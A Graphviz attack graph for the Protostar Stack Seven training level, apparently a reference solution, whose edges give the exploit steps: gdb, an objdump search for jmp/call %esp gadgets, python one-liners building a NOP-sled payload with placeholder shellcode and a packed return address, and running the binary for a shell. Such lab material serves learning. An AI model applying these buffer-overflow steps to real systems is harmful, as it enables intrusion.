digraph AttackGraph {
  rankdir=LR;
  graph [fontsize=12, labelloc="t", label="Attack Graph (reference) - Protostar Stack Seven"];
  node [shape=box, style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica"];
  edge [color="#555555", fontname="Helvetica", fontsize=10];

  start [shape="box", style="rounded,filled", fillcolor="#EAF3FF", color="#444444", fontname="Helvetica", label="Start"];
  node0 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="Saved EIP offset identified"];
  node1 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="Suitable return-into-.text gadget identified"];
  node2 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="Shellcode payload prepared"];
  node3 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="Return target adjusted to jump into shellcode"];
  node4 [shape="box", style="rounded,filled", fillcolor="#E8FFE8", color="#2E7D32", fontname="Helvetica", penwidth="2", label="Interactive shell obtained"];

  start -> node0 [color="#555555", fontname="Helvetica", fontsize="10", label="gdb -q /opt/protostar/bin/stack7"];
  node0 -> node1 [color="#555555", fontname="Helvetica", fontsize="10", label="objdump -d /opt/protostar/bin/stack7 | egrep \"jmp.*%esp|call.*%esp\""];
  node1 -> node2 [color="#555555", fontname="Helvetica", fontsize="10", label="python -c 'print \"\\x90\"*32 + \"<shellcode>\" + \"A\"*(80-32-len(\"<shellcode>\"))' > /tmp/stack7.in"];
  node2 -> node3 [color="#555555", fontname="Helvetica", fontsize="10", label="python -c 'import struct; body=\"\\x90\"*32 + \"<shellcode>\" + \"A\"*(80-32-len(\"<shellcode>\")); print body + struct.pack(\"<I\", 0x08048544)' > /tmp/stack7.in"];
  node3 -> node4 [color="#555555", fontname="Helvetica", fontsize="10", label="/opt/protostar/bin/stack7 < /tmp/stack7.in"];
}
